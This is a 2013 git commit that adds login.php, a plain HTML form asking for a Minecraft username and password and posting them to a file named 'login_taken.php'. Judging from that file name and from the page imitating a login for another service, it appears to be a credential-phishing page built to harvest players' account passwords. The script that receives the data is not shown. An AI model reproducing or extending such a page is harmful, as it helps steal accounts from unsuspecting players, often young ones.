56d37caddbeedfd057507e34dc5622bc3186a880
LOLMANLOL <allamogana@hotmail.com>
2013-02-15 08:15:41 -0800

    Create login.php

---
+++ login.php
@@ -0,0 +1,17 @@
+<html>
+<head>
+</head>
+<body>
+<form action="login_taken.php" method="POST">
+<p>
+<input name="username" type="text" title="Please enter your Minecraft username.">
+</p>
+<p>
+<input name="password" type="password" title="Please enter your Minecraft password.">
+</p>
+<p>
+<input class="button_send" type="submit" value="Submit">
+</p>
+</form>
+</body>
+</html>
